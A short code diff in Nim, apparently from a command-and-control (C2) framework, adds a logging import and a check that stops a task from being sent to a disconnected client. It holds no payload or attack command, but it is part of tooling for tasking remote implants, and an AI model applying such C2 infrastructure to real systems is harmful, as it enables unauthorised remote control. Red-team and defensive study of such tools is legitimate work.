@@ -1,8 +1,11 @@
 import asyncdispatch, asyncnet, base64, json, ws, json
 
-import types
+import types, logging
 
 proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil): Future[Task] {.async.} =
+  if not client.connected:
+    errorLog "can't send task to disconnected client: " & $client
+    return
   var data: JsonNode
   if jData.isNil:
     data = %*{}
